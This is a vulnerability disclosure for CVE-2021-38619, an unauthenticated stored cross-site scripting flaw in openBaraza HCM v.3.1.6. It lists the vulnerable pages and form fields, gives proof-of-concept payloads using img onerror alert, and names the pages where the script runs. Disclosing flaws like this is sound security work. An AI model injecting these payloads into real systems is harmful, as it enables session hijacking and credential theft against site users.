# CVE-2021-38619 openBaraza HCM HR Payroll v.3.1.6 Unauthenticated Stored XSS Vulnerability

openBaraza HCM v.3.1.6 does not properly neutralize user-controllable input, this could allow an unauthenticated remote attacker to conduct a stored cross-site scripting (XSS) attack against an administrative user from multiple pages. If an attacker injects arbitray javascript payload into vulnerable pages and valid users attempt to visit affected pages the payload will be executed. This could result in stealing credentials, session hijacking, or delivering malware to the victim.


Discoverer credits: Charles Bickel & Gideon Gray

---
Vulnerable page:
http://serverip:9090/hr/application.jsp

Vulnerable textboxes:
first_name, surname, email

Payloads:
* <img src='x'onerror="alert('First');" />
* <img src='x'onerror="alert('Surname');" />
* a@a.com<img src='x'onerror="alert('email');" />

Affected page:
http://serverip:9090/hr/index.jsp?view=23:0


![application.jsp](https://raw.githubusercontent.com/charlesbickel/CVE/main/2021-08-12_23-27-23.gif)


---
Vulnerable page:
http://serverip:9090/hr/subscription.jsp

Vulnerable textboxes:
business_name, primary_contact, primary_email, confirm_email

Payloads:
* <img src='x'onerror="alert('business');" />
* <img src='x'onerror="alert('contact');" />
* <img src='x'onerror="alert('email');" />

Affected page:
http://serverip:9090/hr/index.jsp?view=94:0

![subscription.jsp](https://raw.githubusercontent.com/charlesbickel/CVE/main/2021-08-12_23-21-34.gif)
